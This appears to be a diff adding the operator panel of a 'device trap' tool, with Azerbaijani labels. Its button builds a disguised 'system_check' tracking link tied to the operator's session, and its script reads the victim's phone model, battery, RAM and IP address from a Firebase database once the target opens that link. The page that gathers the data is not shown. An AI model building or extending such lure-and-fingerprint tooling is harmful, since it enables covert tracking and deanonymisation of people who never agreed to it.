@@ -1,0 +1,37 @@
+<div id="device-module" style="color: #00dfff; font-family: 'Outfit', sans-serif; padding: 20px; background: #00050a; border: 1px solid #003355; border-radius: 15px;">
+    <h3 style="text-align: center; font-family: 'Syncopate'; font-size: 0.8rem;">DEVICE ANALYSER</h3>
+    
+    <button onclick="genDeviceTrap()" id="d-btn" style="width: 100%; padding: 15px; background: #00dfff; color: black; border: none; font-weight: 900; border-radius: 10px;">ANALYSE TARGET DEVICE</button>
+
+    <div id="device-data" style="margin-top: 20px; display: none;">
+        <div style="background: #000; padding: 10px; border: 1px solid #00dfff; font-size: 0.7rem; margin-bottom: 15px;" id="d-link"></div>
+        <div id="victim-specs" style="font-size: 0.75rem; color: #fff;">
+            <div style="background: rgba(0,223,255,0.05); padding: 15px; border-radius: 12px; border: 1px solid #003355;">
+                <p><i class="fas fa-mobile-alt"></i> Model: <span id="v-model" style="color: #00dfff;">Gözlənilir...</span></p>
+                <p><i class="fas fa-battery-three-quarters"></i> Batareya: <span id="v-bat" style="color: #00ff00;">--</span></p>
+                <p><i class="fas fa-microchip"></i> RAM: <span id="v-ram" style="color: #ffcc00;">--</span></p>
+                <p><i class="fas fa-wifi"></i> IP: <span id="v-ip" style="color: #ff00ff;">--</span></p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    function genDeviceTrap() {
+        const uid = localStorage.getItem('elite_session');
+        const link = window.location.origin + "/system_check.html?ref=" + uid;
+        document.getElementById('d-link').innerText = link;
+        document.getElementById('device-data').style.display = 'block';
+        document.getElementById('d-btn').style.display = 'none';
+
+        db.ref('device_specs/' + uid).on('value', snap => {
+            const d = snap.val();
+            if(d) {
+                document.getElementById('v-model').innerText = d.model || "Unknown";
+                document.getElementById('v-bat').innerText = d.battery + "%" || "N/A";
+                document.getElementById('v-ram').innerText = d.ram + " GB" || "N/A";
+                document.getElementById('v-ip').innerText = d.ip || "N/A";
+            }
+        });
+    }
+</script>
